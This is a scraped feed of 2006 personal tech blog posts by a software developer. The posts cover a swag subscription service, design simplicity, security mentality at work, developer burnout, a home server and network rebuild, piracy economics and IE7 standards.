<p>Microsoft Corporation (NASDAQ &#8220;MSFT&#8221;) develops, markets and supports a wide range of software for business and professional use, including operating systems, network products, languages and applications as well as books, CD-ROM products and hardware for the microcomputer marketplace.</p>

      <title>The Schwag Has Shipped</title>
      <description><blockquote><p><a href="http://adamcaudill.com/files/2006/05/153870159_6aff9f3108.jpg"><img src="http://adamcaudill.com/files/2006/05/153870159_6aff9f3108.thumbnail.jpg" alt="Valleyschwag, May 2006" /></a></p></blockquote>

<p><a href="http://valleyschwag.com/">Valleyschwag</a> has <a href="http://valleyschwag.com/chronicles/2006/05/26/the-may-issue/">shipped</a> the second issue of their bundle o&#8217; schwag to approximately 1,500 subscribers, up from 50 for the first issue. The growth is amazing, and so is the money involved. This month they should have seen somewhere around $21,500 in gross revenue.</p>

<p>For a part-time project where you are just mailing out free stuff, $22,000 a month is not bad at all. There are of course a number of expenses, but this is what&#8217;s important: this is an innovative business model that really works. How well it would go in other industries, I don&#8217;t know, but after seeing the popularity of the Kings o&#8217; Schwag, I&#8217;m sure we&#8217;ll see similar attempts in other industries.</p>

      <title>Web Developer Toolbar &amp; Menu for Opera</title>
      <description><p>I&#8217;ve been using the &#8217;<a href="http://operawiki.info/WebDevToolbar">Web Developer Toolbar &amp; Menu for Opera</a>&#8217; for about the last month and after being reminded today about how useful it is, I thought I should probably mention it for those that haven&#8217;t heard about it.</p>

<p>This is an extremely useful set of toolbar modification to Opera to have a few very nice touches to it. For most of these tasks, there is a Firefox extension available, <a href="http://chrispederick.com/work/webdeveloper/">Web Developer</a>, which does the job quite nicely. Though switching back &amp; forth just to check something small can be quite a pain (as Opera is my primary browser), so thanks to this little gem, it save me that much more time.</p>

<p>As they say, time is money, so every bit saved is a good thing.</p>

      <title>Extreme Simplicity</title>
      <description><blockquote><p>_&#8221;Perfection is achieved, not when there is nothing left to add, but when there is nothing left to remove.&#8221;
<a href="http://en.wikipedia.org/wiki/Antoine_de_Saint-Exupéry">Antoine de Saint-Exupery</a> _</p></blockquote>

<p>Such a simple statement; yet one of such power. This statement carries a new impact as the concept of &#8221;<a href="http://www.procata.com/blog/archives/2006/03/01/extreme-simplicity/">Extreme Simplicity</a>&#8221; gains ground. The idea is that instead of focusing on adding more features (<a href="http://adamcaudill.com/files/2006/05/program_microsoft_windows_xp__box.jpg">Microsoft</a>), do a few things, and do them very well (<a href="http://adamcaudill.com/files/2006/05/ipod20.jpg">Apple</a>).</p>

<p>This is a great concept, focus on the user, focus on what the user spends most of their time doing and keep all the rest out-of-the-way. I&#8217;ll be the first to admit, I&#8217;m addicted to <a href="http://www.codinghorror.com/blog/archives/000150.html">gold plating</a>. If I think it&#8217;s cool, I&#8217;ll add it, which is most certainly at conflict with this concept. This is one area were the two goals leave me quite torn, giving the user every feature possible versus a simple - even minimalistic interface.</p>

<p>All things considered though, this is where things are going. Simple, intuitive designs sell; it&#8217;s that simple. People expect technology of any form to fit in their lives, as simply as if it wasn&#8217;t even there. By building around the core of what the user does and minimizing fluff to enhance the user experience, you&#8217;re giving the end users what they want.</p>

<p>As written by <a href="http://www.acm.org/ubiquity/views/v7i07_pfeiffer.html">Andreas Pfeiffer</a>, here are the 10 fundamental rules of Extreme Simplicity:</p>

<ol>
<li><p>More features isn&#8217;t better, it&#8217;s worse.</p></li>
<li><p>You can&#8217;t make things easier by adding to them.</p></li>
<li><p>Confusion is the ultimate deal-breaker.</p></li>
<li><p>Style matters.</p></li>
<li><p>Only features that provide a good user experience will be used.</p></li>
<li><p>Any feature that requires learning will only be adopted by a small fraction of users.</p></li>
<li><p>Unused features are not only useless, they can slow you down and diminish ease of use.</p></li>
<li><p>Users do not want to think about technology: what really counts is what it does for them.</p></li>
<li><p>Forget about the killer feature. Welcome to the age of the killer user-experience.</p></li>
<li><p>Less is difficult, that&#8217;s why less is more.</p></li>
</ol>


<p>We all know that users <a href="http://www.amazon.com/gp/product/0789723107/">don&#8217;t want to think</a>; this design philosophy further refines the concept and simplifies it to the point that it can be applied to almost any form of technology. By designing with a goal of maximizing simplicity, you create software that fits in the users&#8217; life, instead of fitting them into your product.</p>

<p>If you want your product to sell, find a way (though difficult it may be) for your product to be both indispensable and unobtrusive.</p>

      <title>A Secure Mentality</title>
      <description><p>My employer recently completed the final audit to confirm ISO 17799 compliance, the process was a real eye opener. In a process that should have been fairly short &amp; painless, the ordeal lasted close to a year, with me joining the company just before the second, and largest audit. That made my first few weeks rather <em>interesting</em>, to say the least.</p>

<p>While 17799 does have some complex requirements, most of the issues found had more to do with the overall mentality than with the true technical issues involved. The mentality at work tends to be to not seek what&#8217;s secure, but to find what works, and what&#8217;s fast - regardless of its impact. Without always being aware of the security issues involved, it&#8217;s easy to introduce significant vulnerabilities into a system.</p>

<p>There are three primary groups of thought when it comes to security:</p>

<ol>
<li><p><strong>Those that don&#8217;t know or care.
</strong>In the business world, these are by far the most common users, they don&#8217;t understand the implications and they typically want to keep it that way. These users introduce an amazing number of issues into a system.</p></li>
<li><p><strong>Those that know, but don&#8217;t care enough to do things right.</strong>
These are less common, though they pose an equal, if not greater risk. When the pressure to have tasks done in an extremely short time is high enough, security shortcuts are often the result. While it typically doesn&#8217;t add significantly to time-lines, there is a time cost to ensuring that proper processes are followed.</p></li>
<li><p><strong>Those that put security first.</strong>
This is the smallest group, though when equipped with the proper authority, can have the greatest impact. These rare people who both understand and care tend to carry the burden for the ignorance and laziness of the other major groups. It is there duty to see that data is secure, and systems are well protected against possible attacks.</p></li>
</ol>


<p>Keeping a constant eye on security is critical, especially for developers - as our work can have an impact on such a large number of end users. Many developers tend to under-appreciate the impact they can have, both for the good their work does, and the harm their mistakes can cause. Finding a clear understanding of the implications of a decision is vitally important.</p>

<p>Even if you think something may not raise a security issue, take the time to evaluate the possibilities. Its well worth the time, trust me, <a href="http://securitytracker.com/alerts/2004/Oct/1011994.html">I know this</a>. A single error on my part as to how the application needed to secure its data led to a public announcement of the issue to the famous BugTraq mailing list. A simple mistake, with a definite impact on how I view potential security issues.</p>

<p>Thankfully that issue was small enough that it didn&#8217;t cause any real harm, but it certainly taught me a lesson. In that decision, I didn&#8217;t consider the possible implications, it led to what I consider a rather public embarrassment.</p>

<p>Next time you work on a feature that could be abused in any way, take a few minutes to think about ways to make it safer and more secure. You&#8217;ll thank yourself later.</p>

      <title>Valleyschwag</title>
      <description><p>A few days ago, one of my favorite blogs <a href="http://www.techcrunch.com/2006/05/04/get-web-20-schwag-from-valleyschwag/">mentioned</a> this interesting service, <a href="http://www.valleyschwag.com/">Valleyschwag</a>. For $15 a month, will bundle up a package of the best <a href="http://en.wikipedia.org/wiki/Promotional_item">schwag</a> being handed out in silicon valley, and deliver it right to your doorstep. This really is a great idea, for a few reasons.</p>

<p><strong>A new twist on Viral Marketing</strong></p>

<p>I really like this concept, from both sides of the coin. For companies, they can supply these promotional items at minimal cost to a larger, more targeted audience. While for the end user, they pay a fairly minimal service fee to receive cool stuff. What could be better, free stuff &amp; nearly free advertisement.</p>

<p>This allows for some really creative marketing, getting the brand out without wasting money on sending products to those that have no real interest is critical. With so much money wasted on typical give-aways, for many companies with a lower budget, such promotions aren&#8217;t an option. A service such as this is great for these smaller shops, it allows doors to be opened that otherwise would have gone untouched.</p>

<p><strong>Let The Bribing Begin</strong></p>

<p>Let&#8217;s face it, free stuff is great, and <a href="http://www.valleywag.com/tech/valleyschwag/valleyschwag-april-stickers-tees-and-a-little-nerf-man-171121.php">people love it</a>. The $15 being charged is close enough to free for what you&#8217;re getting, at least one shirt, plus enough stickers to cover that ugly laptop.  In general, people are easily bribed, and when good companies with good products do the bribing, it works out great for all involved.</p>

<p><strong>The Future of Marketing</strong></p>

<p>These companies realize something important, traditional forms of advertising aren&#8217;t that effective, and among the web crowd, even less so. To get your name out, you need to not only have a good product, but give users a reason to talk about your product. Word of mouth is the way to go, and with lower-budget Web 2.0-types seeking ways to build buzz, this provides an excellent opportunity.</p>

<p>The companies that donate these items receive not only more, but better press than they could buy. If this works well, expect to see copy-cats springing up in other industries. This is certainly an interesting idea and I can&#8217;t wait to see where it goes.</p>

<p>I&#8217;ll be keeping an eye on this, I&#8217;ll post again once I receive my first package. ;)</p>

      <title>The Pressure to Be Great</title>
      <description><p>I&#8217;m a developer, and I love what I do, it&#8217;s a great industry, and a very exciting field to be in. If you read my blog often, you&#8217;ll see I take every opportunity to mention how great this line of work can be, today I offer a somewhat different, less sugar-coated view.</p>

<p><strong>The Pressure</strong></p>

<p>There is a constant pressure on developers to be better, to do more, to produce more, sometimes more than is possible. The budgets are getting smaller, and projects becoming more complex, the pressure on a developer to deliver more is extreme.</p>

<p>While everyone strives to be better, this pressure is different, this is the pressure of a CIO explaining the shouting match that ensued at the last status update, the pressure of a senior VP explaining the project <em>must</em> be done <strong>today</strong>. These are the pressures that cause developers to push themselves to not just be great, but to attempt to achieve super-human productivity.</p>

<p>By pushing so hard, a developer can achieve an amazing amount in a short time. With the help of enough <a href="http://www.amazon.com/gp/product/B00032BTA0/002-5134644-0764815?v=glance&amp;n=3370831">sugar</a> &amp; <a href="http://www.sobeadrenalinerush.com/">caffeine</a>, it&#8217;s possible to pull 16 hour days, coding the whole time. When management realizes this, they turn the pressure up even higher, expecting such feats on a regular basis.</p>

<p>While members of management that deal directly with developers tend typically to not push for such attempts, senior management sees it as a way to get an extra developer, without cutting another pay-check. Why hire someone if you can get your current staff working 80-hour weeks (ideally for no extra pay)?</p>

<p>Once senior management sees that so much more can be done with the right amount of pressure, they will take full advantage of this fact, and turn even the smallest, least important projects into emergencies. This is a cycle, that once begun will continue to spiral out of control, at a largely unseen, but considerable cost.</p>

<p><strong>The Effect</strong></p>

<p>The effect of this is clear, and in many ways tends to further feed the cycle. The first and most clear side-effect is the reduced quality of the product produced. A development team that is living on a <a href="http://www.thinkgeek.com/caffeine/">caffeine</a> diet will introduce for more bugs than a team working at a more reasonable pace.</p>

<p>These additional bugs are often met with reports going back to the developers, demanding they be fixed at once. Not only must the bug be fixed, but it must be done without adding any delay to the rest of the project. This simply leads further into the urgency cycle, and further increases the already intense pressure.</p>

<p>As time goes on, and a team falls further into this hole, the quality will steadily drop, along with morale and loyalty. For a short while, this pressure will result in amazing results, but in the long run will either destroy the team, or even the developers themselves.  This pressure leads quickly to burnout, often leading to developers to leave the industry altogether.</p>

<p><strong>The True Cost</strong></p>

<p>The cost of this falls with greatest weight on the developers and their ability to work. As programming is such a thought intensive process, mental fatigue is a major concern. A developer that can&#8217;t think clearly is nearly useless, without clear focus, there will be nothing that resembles productivity - or the desired product.</p>

<p>The effect of mental fatigue, combined with the high stress levels quickly depletes a programmer&#8217;s energy and motivation. Leaving a developer that is slow, frustrated, and feels that the light at the end of the tunnel is no longer the next milestone, but a speeding train. Developers in this state often add little more than delays to a project.</p>

<p><strong>Conclusion</strong></p>

<p>While I often sugar-coat life as a developer, there are real drawbacks, of which this is but one. The pressure can be near crushing at times, but looking at the big picture, I do still love what I do. I still hold out hope for improvement, though I&#8217;ll not be holding my breath. One day, maybe.</p>

      <title>What A Surprise!</title>
      <description><p>I&#8217;m a fairly active member of a forum focus on VB development, <a href="http://www.xtremevbtalk.com/">XtremeVBTalk.com</a> (formerly VisualBasicForum.com), I also happen to be a moderator, and carry the &#8220;Expert&#8221; skill-badge. Well, today they gave me quite a surprise. Back 2003 I posted this on my site at the time:</p>

<blockquote><p><em><strong> 12/01/2003</strong>
<strong>Expert!</strong> The folks over at <a href="http://www.xtremevbtalk.com/">VisualBasicForum.com</a> just voted to give me an Expert badge!</em></p></blockquote>

<p>Today, a similar honor has been bestowed. By a vote of the forum leadership I&#8217;ve been given the status of &#8220;Guru&#8221; - the highest skill acknowledgment available. This was quite a surprise, and really quite an honor as this is a status given to only a select few. This makes me the 26th to receive this, of the 91,348 current members.</p>

<p>I really do appreciate this, to be judged so by a group that I hold in such high regard really does mean a lot.</p>

      <title>PowerEdge 2500</title>
      <description><p>As I&#8217;ve <a href="http://adamcaudill.com/2006/04/09/rebuilding-my-network/">written</a> about, I&#8217;m in the process of rebuilding my network at home. the first major addition is a used <a href="http://docs.us.dell.com/support/edocs/systems/pe2500sc/en/ug/127kwc10.htm">Dell PowerEdge 2500</a> server, while this is an older server, it&#8217;s quite stable and reliable - and with I intend to use it for, being reliable is critical.</p>

<p><a href="http://adamcaudill.com/files/2006/04/P4180001SM.JPG"><img src="http://adamcaudill.com/files/2006/04/P4180001SM.thumbnail.JPG" alt="Front and box" /></a> <a href="http://adamcaudill.com/files/2006/04/P4180003SM.JPG"><img src="http://adamcaudill.com/files/2006/04/P4180003SM.thumbnail.JPG" alt="Face behind the mask" /></a> <a href="http://adamcaudill.com/files/2006/04/P4180002SM.JPG"><img src="http://adamcaudill.com/files/2006/04/P4180002SM.thumbnail.JPG" alt="Guts of the beast" />
</a></p>

<p>This server will have a couple different roles at once, here&#8217;s the basics:</p>

<ul>
<li><p>Domain Controller</p></li>
<li><p>Development SQL Server</p></li>
<li><p>Development IIS Server</p></li>
<li><p>&#8216;Shared Files&#8217; share</p></li>
</ul>


<p>This will allow me to keep a stable system running for shared access to development resources, as well as centralize management for my various systems. This box may also see a few more tasks aimed its way in the next couple months as this project goes on.</p>

<p><strong>Building the Server</strong></p>

<p>The process of rebuilding the server was surprisingly painless. After setting up the RAID array (set to RAID 10), there were no real speed bumps; the Windows install went smoothly and I was quickly on to setting up more important things, like my new domain.</p>

<p>I choose <a href="http://www.microsoft.com/windowsserver2003/default.mspx">Windows Server 2003 R2</a> as the OS due to its stability and flexibility. With the number of roles this system will have, along with the pounding development work will give it, those are very important traits. With the exception of a few issues while setting up the domain (like importing local accounts), the process was almost pleasant.</p>

<p><strong>Server Details</strong></p>

<p>The server itself seems rather beef (keeping its age in mind), and more than enough I believe for what I have planned for it. For those interested, here are the vital details:</p>

<ul>
<li>1 x <a href="http://processorfinder.intel.com/scripts/details.asp?sSpec=SL5U3&amp;ProcFam=25&amp;PkgType=ALL&amp;SysBusSpd=ALL&amp;CorSpd=ALL">933MHz Intel Pentium III</a> CPU</li>
<li><p>A second, matching CPU has already been ordered.</p>

<ul>
<li>6 x 18.9 GB 10,000 RPM SCSI Hard-drives</li>
</ul>
</li>
<li><p>These are in a RAID 10 configuration giving about 50GB of fully redundant storage.</p>

<ul>
<li><p>3 x 300W redundant power supplies</p></li>
<li><p>1 x 128MB PC100 RAM dedicated to the RAID controller</p></li>
<li><p>2 x 256MB PC133 Registered ECC RAM</p></li>
</ul>
</li>
<li>This will be upgraded soon.</li>
</ul>


<p>While clearly this isn&#8217;t a power-house by modern standards, it is a very well made server, that packs plenty of power. I hope to keep this one around for quite some time.</p>

      <title>USQL: Unified SQL Editor</title>
      <description><p>On a daily basis, I use Query Analyzer for Microsoft SQL Server, Microsoft Access for Sybase via ODBC, <a href="http://www.mysql.com/products/tools/query-browser/">MySQL Query Browser</a>  for a MySQL database, and <a href="http://www.allroundautomations.nl/plsqldev.html">PL/SQL Developer</a>  for Oracle access. While there are some features of all of these I really like, what I don&#8217;t like is that I have to use all of them.</p>

<p>I am proposing the formation of an open source project to develop a SQL front-end to allow users to access the major database platforms from a single, well-designed, and fully-featured front end. This would not be a full replacement of the afore mentioned applications, but a simpler, easy to use product wrapping the more common functionality. Developed in .NET (VB.NET most likely), this could greatly simplify the process of working with multiple DB platforms.</p>

<p>This is just an idea, and I would like to hear any feedback. If there&#8217;s enough interest, I may try to put something together to get the ball rolling.</p>

      <title>Piracy: Modern Marketing</title>
      <description><p>Piracy is bad, right? Maybe not, and it seems Microsoft <a href="http://www.latimes.com/business/la-fi-micropiracy9apr09,0,414067.story">figured</a> <a href="http://www.downloadsquad.com/2006/04/13/windows-vista-pirates-wont-get-fancy-graphics/"> it</a> <a href="http://news.com.com/Microsoft+Can+we+check+your+software+license/2100-1016_3-5371664.html?tag=nl"> out</a>. Piracy can be indirectly profitable, both by giving you additional customers that you may collect from at some future point, and it also serves to reduce or limit the market share of rivals. Microsoft chairman, Bill Gates, acknowledged this back in 1998 while speaking at the University of Washington, saying:</p>

<blockquote><p>_&#8221;Although about 3 million computers get sold every year in China, people don&#8217;t pay for the software. Someday they will, though,&#8230;&#8221; _</p></blockquote>

<p>_&#8221;And as long as they&#8217;re going to steal it, we want them to steal ours. They&#8217;ll get sort of addicted, and then we&#8217;ll somehow figure out how to collect sometime in the next decade.&#8221; _</p>

<p>While Microsoft claimed losses of $14 billion for 2005, there were also several benefits as a result, that Microsoft rarely acknowledges. Among these is:</p>

<ul>
<li><p>Limiting growth of rival products</p></li>
<li><p>Locking users into Microsoft products</p></li>
<li><p>Increasing overall market-share</p></li>
<li><p>Increasing brand awareness</p></li>
</ul>


<p>Given the choice, I&#8217;m sure that Microsoft would rather see the $14 billion they claimed they lost, though in reality, I don&#8217;t believe the number would be that high. There is an unknown variable in the equation, when determining what the loss due to piracy is; the number of users that would have chosen the same product if they had to pay for it.</p>

<p><strong>Holding Linux Back</strong></p>

<p>Even though at least one Linux vendor <a href="http://news.zdnet.co.uk/software/linuxunix/0,39020390,39195424,00.htm">sees possible value</a> in piracy, for the most part Linux stands to lose the most. It has been <a href="http://informationweek.com/story/showArticle.jhtml?articleID=170700943">shown</a> that cracking down on piracy actually helps Linux. Users they are either not fully locked in, or adding new systems tend to be looking towards Linux, instead of sticking with Windows and its related products due to the high costs involved.</p>

<p>Microsoft has a vested interest in limiting the market share of Linux, and it other competitors, keeping this in mind, it easy to understand some recent moves Microsoft has made. One of the more interesting is the decision to block pirates from using the new Aero shell in Windows Vista (there is also <a href="http://www.microsoft.com/presspass/newsroom/winxp/08-10WinXPStarterFS.mspx">Windows XP Starter Edition</a> which is interesting in its own right). This begs the question, if Microsoft thinks they can stop pirates, why let them run the OS at all?</p>

<p><strong>Locking Users In</strong></p>

<p>While hard numbers aren&#8217;t easy to find, there are <a href="http://www.infoworld.com/infoworld/article/03/08/29/34FElinux_1.html">several</a> <a href="http://www.vnunet.com/vnunet/news/2153346/migration-costs-holding-back">reports</a> on the expense of migrating from Windows to Linux. Regardless of TCO, ROI, any business metric, it can be safely acknowledged that it isn&#8217;t cheap to move an entire corporate network to a different platform. This fact is a key benefit for Microsoft, as many businesses may find it cheaper to just pay, than to switch platforms.</p>

<p>As an example, take this fictional Asian company, running purely on pirated software, here is the vital information about their network:</p>

<ul>
<li><p>400 PCs running Windows XP</p></li>
<li><p>18 Servers running Windows 2003 Server</p></li>
<li><p>250 PCs with Office 2003</p></li>
<li><p>Extensive use of Excel automation in critical business processes</p></li>
<li><p>Most data stored in 2 SQL Server 2005 servers</p></li>
<li><p>All email stored in Exchange server</p></li>
</ul>


<p>This would be a nightmare to convert, the user re-training, data migration, re-development of business processes. Facing a crackdown on piracy, this fictional business would have little choice but to pay up for what they are using.</p>

<p>If you can lock users into your products, and then latter try to put pressure on them to pay for what they are using, you have a far better chance of seeing money, than if the users had went with a different platform from the beginning.</p>

<p><strong>Cashing In</strong></p>

<p>Through the use of programs like the afore mentioned restriction on the use of the Aero shell, and the use of the <a href="http://www.microsoft.com/genuine/default.mspx?displaylang=en">Windows Genuine Advantage</a> program to <a href="http://www.msnbc.msn.com/id/6868504/">restrict the use of Windows Update</a>, Microsoft can apply additional pressure on the users of pirated versions of its software. While most anti-piracy schemes have been cracked fairly quickly, it does add significant pressure to the &#8216;casual pirate&#8217; - home or corporate users that simply got a copy from a friend.</p>

<p>By leveraging legal pressure and user annoyance, you can slowly begin to reap in profits from these users, if you can avoid pushing them to another platform in the process.</p>

      <title>Wink 2.0</title>
      <description><p>I&#8217;m always interested in better ways to produce documentation or demonstrations for my software. One method I&#8217;ve found to be rather impressive is desktop capture, generating a movie either in a streaming format, or in Flash. The drawback: Price. The tools used for this are often rather expensive, and on a tight budget they can push you to the limit quickly. There is another option though, <a href="http://www.debugmode.com/wink/">Wink</a>  - a free, cross-platform application that generates Flash demos and presentations.</p>

<p>From my short review, this seems like an excellent option, and the fact that it&#8217;s free just makes it even better.</p>

<p>I saw noticed an article on <a href="http://www.forbes.com/technology/2006/04/13/google-calendar-yahoo_cx_df_0413google.html">Forbes</a> mentioning the long rumored, <a href="http://www.google.com/calendar">Google Calendar</a> , and sure enough! While I&#8217;ve not taken long to play with it, this, so far, seems to be very cool. I&#8217;ll post more after I play with it for a while.</p>

      <title>Better late than never&#8230;</title>

While it look it&#8217;s time about getting here, it finally arrived. The book, while not the full version, is larger than I expected, and looks like it should be worth reading. I&#8217;m a bit disappointed in how soon that the discount for the <a href="http://www.microsoft.com/learning/mcp/mcp/">MCP</a> <a href="http://www.microsoft.com/learning/exams/70-528.asp">exam</a> expires, as with the schedule I have for the desktop <a href="http://adamcaudill.com/2006/03/25/mcts/">MCTS</a> I don&#8217;t think I&#8217;ll have time to make use of it.</p>

<p>All in all, this is one of the best free offers I&#8217;ve seen Microsoft release. The offer is still open (closes the 17th), so if you&#8217;ve not signed up for yours - you should hurry.</p>

      <title>Best Job In The US: Software Engineer</title>
      <description><p>MONEY Magazine and Salary.com have announced their <a href="http://money.cnn.com/magazines/moneymag/bestjobs/">top 10 jobs</a>  in the country. While it&#8217;s no surprise to me, Software Engineer took the #1 spot. Here&#8217;s what they had to say:</p>

<blockquote><p>_<strong>Why it&#8217;s great</strong> Software engineers are needed in virtually every part of the economy, making this one of the fastest-growing job titles in the U.S. Even so, it&#8217;s not for everybody.</p></blockquote>

<p>Designing, developing and testing computer programs requires some pretty advanced math skills and creative problem-solving ability. If you&#8217;ve got them, though, you can work and live where you want: Telecommuting is quickly becoming widespread.</p>

<p>The profession skews young &#8211; the up-all-night-coding thing gets tired &#8211; but consulting and management positions aren&#8217;t hard to come by once you&#8217;re experienced.</p>

<p><strong>What&#8217;s cool</strong> Cutting-edge projects, like designing a new video game or tweaking that military laser. Extra cash from freelance gigs. Plus, nothing says cool like great prospects.</p>

<p><strong>What&#8217;s not</strong> Jobs at the biggest companies tend to be less creative (think Neo, pre-Matrix). Outsourcing is a worry. Eyestrain and back, hand and wrist problems are common._</p>

<p>Software development is certainly a great career, and here is yet more proof - from outside the industry.</p>

      <title>Development Abstraction</title>
      <description><p>When it comes to the world of development, <a href="http://www.joelonsoftware.com/">Joel Spolsky</a>  is, without a doubt, my favorite writer. His work is always interesting and on-topic, and his latest work is something special. <a href="http://www.joelonsoftware.com/articles/DevelopmentAbstraction.html">Development Abstraction</a>, what a concept, the only way to ensure the highest productivity, and perhaps, a large part of the <a href="http://adamcaudill.com/2006/04/07/superstars-monkeys/">Superstars &amp; Monkeys</a>  issue.</p>

<p>When I wrote about my views on how developers are treated, it was from a developers perspective, this article provides the managers perspective, on much the same issue. This covers what a development team should see, noting more, nothing less. Focus is critical for productivity, the hassles of running a business, finding ways around over-restrictive internet filters, or wondering how long the Development database will be hosting Production databases, none of this should be involved in a developers day.</p>

<p>Development is a thought driven, focus dependent activity. Anything that gets in the way should be eliminated, anything.</p>

      <title>IE7: Of Time &amp; Standards</title>
      <description><p>While I&#8217;m not a huge fan of Internet Explorer, I am quite impressed with the progress the <a href="http://blogs.msdn.com/ie/default.aspx">IE team</a> has made. IE7 stands to be the most impressive release so far, with many rendering issues resolved, rather impressive <a href="http://blogs.msdn.com/ie/archive/2006/03/15/552246.aspx">security</a> advances, and a great many improvements on the <a href="http://blogs.msdn.com/ie/archive/2005/10/12/480242.aspx">standards compliance</a> front. I must applaud both the team, and Microsoft for making these moves.</p>

<p>By focusing on standards, instead of proprietary features that degrade the experience for everybody, developers can work towards a unified web, free of browser discrimination and hack filed code. It seems like the Redmond power house has finally started to see where IE needs to go to remain relevant for Web 2.0, and beyond.</p>

<p>Then again, that&#8217;s leaving <a href="http://blogs.msdn.com/ie/archive/2006/04/07/571198.aspx">TIME</a> out of the picture.</p>

<p><strong>Time up for TIME?</strong></p>

<p>While <a href="http://msdn.microsoft.com/library/default.asp?url=/workshop/author/behaviors/time.asp?frame=true">HTML + TIME</a> could prove to be a fun toy, due to its very nature - it&#8217;s a toy not everybody could enjoy. This is an older (introduced with IE5), proprietary technology that is fairly unknown, and not often used. While it does have some merits in its concept, any design technology that is intended to serve a single, closed platform is simply a bad idea.</p>

<p>Why Microsoft is taking another look at this, I&#8217;m really not sure. I&#8217;m holding out hope that they are cleaning up old, non-standard features in preparation for the next release. My fear is that they want to make another push with this out-dated, IE-centric technology.</p>

<p><strong>Holding out hope&#8230; </strong></p>

<p>Let&#8217;s hope they make the right call, and remove support for proprietary &#8216;features&#8217; such as this. IE7 has the chance to not only catch up with the other major players, but to help push the wide-spread adoption of standards compliance.</p>

      <title>Rebuilding My Network</title>
      <description><p>Over the next three months or so I plan on more-or-less rebuilding all of my computers, and the network they sit on. This is going to be a fairly time consuming process, though I expect should be well worth it. This includes the addition on a couple new computers, as well as new hardware for the existing ones. Among the various changes is the move to a rack-mount environment, away from normal tower cases. I think this is going to be quite a project.</p>

<p>Here&#8217;s how things look now:</p>

<ul>
<li><p>Primary Desktop (WinXP, tower case)</p></li>
<li><p>Subversion Server (Win2000, tower case)</p></li>
<li><p>(Misc hardware strewn about)</p></li>
</ul>


<p>On to the changes&#8230;</p>

<p><strong>Dell PowerEdge 2500</strong></p>

<p>The first (and largest) change is the addition of a used Dell PowerEdge 2500 server, that will server as a development SQL &amp; Web server. This will eliminate the need to be running SQL Server on my primary PC.</p>

<p><a href="http://adamcaudill.com/files/2006/04/powerfront.jpg"><img src="http://adamcaudill.com/files/2006/04/powerfront.thumbnail.jpg" alt="powerfront.jpg" /> </a></p>

<p>This was a beefy server in its day, though it&#8217;s somewhat underpowered for many of the more demanding projects servers have to deal with. This makes it a perfect development server. This allows a better view of the impact software can have on it, as well as being light on the budget, leaving money for more important things.</p>

<p>This box is currently setup with 1 PIII 933Mhz CPU (I plan on upgrading this), 512MB of RAM (it&#8217;ll be seeing at least a couple of <a href="http://www.newegg.com/Product/Product.asp?Item=N82E16820999201">these</a> in the rebuilding process), and <strong>6</strong> 18.2GB SCSI HDs. So it&#8217;s far from top of the line, but it&#8217;ll be a great development box.</p>

<p><strong>Primary PC</strong></p>

<p><img src="http://adamcaudill.com/files/2006/04/23513141.jpg" alt="23513141.jpg" /></p>

<p>My primary desktop is also my primary development box, this is the most important box on the network. Right now it&#8217;s a Windows XP box, and will see the fewest changes of all the systems I have. The only major change will be moving it from it&#8217;s existing tower case to a CODEGEN 4U-500-CA rack mount case. This is part of the move to consolidate all of my hardware and get rid of the &#8216;towers on top of towers&#8217; issue I have now.</p>

<p>This is the first time I&#8217;ve tried to migrate from a tower to a rack-mount, so there may a couple &#8220;gotcha&#8217;s&#8221; that I&#8217;ve not anticipated, I&#8217;m hoping this is a smooth move.</p>

<p><strong>Subversion Server</strong></p>

<p>For an existing system, the subversion server will see the most changes. This server started out as my desktop, and has by now been relegated to the role of hosting subversion, and thats about it. To make this box more useful, I plan on adding a <a href="http://www.newegg.com/Product/Product.asp?Item=N82E16816220001">SABRENT RAID controller</a>, as well as a couple Western Digital <a href="http://www.westerndigital.com/en/products/Products.asp?DriveID=137">160GB SATA</a> drives (I&#8217;ll add a couple more latter). This will allow it to server as not only the subversion server, but also as a file archive server.</p>

<p>The other change for this server is the move to the CODEGEN 4U-500-CA rack mount case, the same one I&#8217;m using for my PC. getting these boxes all in a rack will be quite nice I think.</p>

<p><strong>KVM</strong></p>

<p><img src="http://adamcaudill.com/files/2006/04/p11381a.thumbnail.jpg" alt="p11381a.jpg" />As a use a single keyboard/monitor for my separate computers, a KVM is a must. I&#8217;ll be replacing my <a href="http://adamcaudill.com/files/2006/04/FUL1_F1DL102P.jpg">existing</a> KVM, with a new one from JustCom. Based on the reviews I&#8217;ve seen, the <a href="http://www.newegg.com/Product/Product.asp?Item=N82E16817107056">JC-104PE</a> looks like a nice choice for my needs, while trying to keep to a tight budget.</p>

<p><strong>Firewall / Router
</strong></p>

<p>After doing some research, and speaking to Andrew about his ideas (see comments), I&#8217;ve opted to pick up an older rack mount server from eBay, and using that as a firewall / router / VPN. It will most likely be running <a href="http://www.centos.org/">CentOS</a>, and using IPTables as the basis for the firewall functionality. This will eliminate the need for my current Linksys router.</p>

<p>Using a single box as the firewall &amp; router should provide excellent performance, and be very secure.</p>

<p><strong>Switch</strong></p>

<p>The Linksys router is being replaced, adding the need for a new switch. I&#8217;ve opted for the <a href="http://www.newegg.com/Product/Product.asp?Item=N82E16817111021">D-Link DGS-1008D</a>, this is a Gigabit switch, and should bring a real speed boost over the current 100Mbit network.</p>

<p><strong>Linux PC</strong></p>

<p><img src="http://adamcaudill.com/files/2006/04/linux-penguin%5B1%5D.thumbnail.jpg" alt="linux-penguin[1].jpg" />This will probably be one of the last steps in the rebuild process. I&#8217;m going to be using the same CODEGEN 4U-500-CA case, along with an ASUS motherboard to form the basis of this system. This will most likely be running <a href="http://www.novell.com/products/desktop/preview.html">SUSE 10</a>, this will give me two fairly modern PCs, one for Windows development, one for Linux development. I image once that&#8217;s setup, most of my PHP work will be done from there, should prove much easier than working on Windows.</p>

<p><strong>The Rack</strong></p>

<p>I&#8217;ve yet to figure out what I&#8217;m going to do for a rack to hold all of this. This is stall an open item in my plan.</p>

<p><strong>Thoughts? </strong></p>

<p>If anybody has any ideas or comments about the direction I&#8217;m heading, or the products I&#8217;m using, feel free to let me know.</p>

      <title>Microsoft Virtual Server: Free</title>
      <description><p>Microsoft recently moved to release their <a href="http://www.microsoft.com/windowsserversystem/virtualserver/default.mspx">Virtual Server 2005</a> software for <a href="http://www.microsoft.com/windowsserversystem/virtualserver/software/default.mspx">free</a>. This is a somewhat unexpected, yet not surprising move by the software giant. With the fairly recent move to release a free edition of <a href="http://www.vmware.com/products/server/">VMware Server</a>, as well as recent strides in the Linux Virtualization space; the pressure on Redmond to deliver is clear.</p>

